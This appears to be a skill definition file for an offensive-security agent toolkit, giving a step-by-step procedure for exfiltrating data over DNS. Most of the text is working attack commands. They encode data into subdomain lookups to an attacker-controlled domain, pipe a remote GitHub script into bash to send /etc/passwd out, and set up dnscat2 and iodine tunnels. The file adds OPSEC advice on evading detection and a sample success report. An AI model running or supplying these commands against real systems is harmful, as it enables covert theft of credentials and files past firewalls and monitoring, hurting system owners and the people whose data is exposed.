---
name: data-exfil-dns
description: Exfiltrate data using DNS queries as covert channel
version: 1.0.0
phase: post
category: post-exploitation
tags: [exfiltration, dns, tunneling, covert-channel]
tools: [curl, dnscat2, iodine]
difficulty: advanced
opsec_level: high
time_estimate: 5m
severity_if_found: critical
related_skills:
  - data-exfil-http
  - credential-harvest
mitre_attack:
  - T1048.003
  - T1071.004
---

## When to Use

Use this skill when HTTP exfiltration is blocked but DNS resolution is allowed.
DNS exfiltration encodes data in DNS queries to an attacker-controlled domain,
bypassing most firewalls and DLP solutions.

## Prerequisites

- curl for testing
- Attacker-controlled DNS server (or dnscat2/iodine)
- DNS resolution allowed from compromised host
- Knowledge of data to exfiltrate

## Procedure

```bash
# 1. Test DNS resolution capability
nslookup attacker-controlled-domain.com
dig TXT attacker-controlled-domain.com +short

# 2. Manual DNS exfiltration — encode data as subdomains
DATA=$(echo "secret-data-here" | base64 | tr -d '=' | tr '/+' '-_')
for chunk in $(echo $DATA | fold -w 30); do
  nslookup "${chunk}.exfil.attacker-controlled-domain.com" 2>/dev/null
done

# 3. DNS exfiltration via TXT records (higher bandwidth)
# On attacker server: listen for DNS queries
# On compromised host:
curl -sk "https://raw.githubusercontent.com/arr0way/dns-exfil/master/dns_exfil.sh" | bash -s -- \
  -f /etc/passwd -d attacker-controlled-domain.com

# 4. Install and use dnscat2 for interactive tunnel
dnscat2-server attacker-controlled-domain.com
# On compromised host:
dnscat2 attacker-controlled-domain.com

# 5. Iodine IP-over-DNS tunnel
# On attacker server:
iodined -f 10.0.0.1 tunnel.attacker-controlled-domain.com
# On compromised host:
iodine -f tunnel.attacker-controlled-domain.com

# 6. Test DNS data extraction with curl
echo "test-data" | xxd -p | tr -d '\n' | fold -w 16 | while read hex; do
  curl -s "http://${hex}.exfil.attacker-controlled-domain.com" >/dev/null 2>&1
done

# 7. Verify data received on attacker server
# Check DNS query logs on attacker-controlled authoritative server
```

## OPSEC Rules

- **HIGH RISK**: DNS exfiltration is slow but very stealthy
- Use low query rates to avoid DNS anomaly detection
- Encode data in hex/base32 to avoid invalid subdomain characters
- Chunk data into small segments (< 30 chars per subdomain)
- Do not exfiltrate large files via DNS — use for credentials/secrets only
- Clean up tunnel software after assessment

## Verification

- Confirm DNS queries reach attacker-controlled server
- Verify data can be reconstructed from DNS logs
- Check if DNS-over-HTTPS (DoH) is supported (higher bandwidth)
- Test different encoding schemes for reliability

## Pitfalls

- DNS exfiltration is slow (bytes per query)
- Some DNS servers rate-limit or block unusual query patterns
- IDS/IPS may detect high-entropy subdomain queries
- Data integrity may be compromised (UDP, no ACK)
- Long data transfers increase detection risk
- Some networks use DNS firewalls (Cisco Umbrella, etc.)

## Output Format

```
[EXFIL-DNS] DNS exfiltration successful
  Method: Subdomain encoding (hex)
  Domain: exfil.attacker-controlled-domain.com
  Data: /etc/passwd (1.2KB, 42 queries)
  Duration: 45 seconds
  Severity: CRITICAL

[TUNNEL] dnscat2 tunnel established
  Server: attacker-controlled-domain.com
  Bandwidth: ~5KB/s
  Severity: CRITICAL
```
